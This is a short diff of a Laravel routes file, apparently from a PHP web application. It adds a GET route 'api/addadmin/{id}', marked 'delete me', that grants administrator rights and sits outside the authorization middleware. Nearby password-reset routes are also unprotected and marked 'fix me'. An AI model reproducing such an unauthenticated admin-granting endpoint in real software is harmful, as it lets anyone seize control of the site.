@@ -25,6 +25,8 @@ Route::post('api/user/register', 'UserController@register');
 Route::get('user/{id}/resetpwd', 'UserController@showResetpwd'); //fix me
 Route::post('user/{id}/resetpwd', 'UserController@doResetpwd'); // fix me
 
+Route::get('api/addadmin/{id}', 'SyssettingController@addAdmin'); // delete me
+
 Route::group([ 'middleware' => 'can' ], function () {
     // project route
     Route::get('api/myproject', 'ProjectController@myproject');
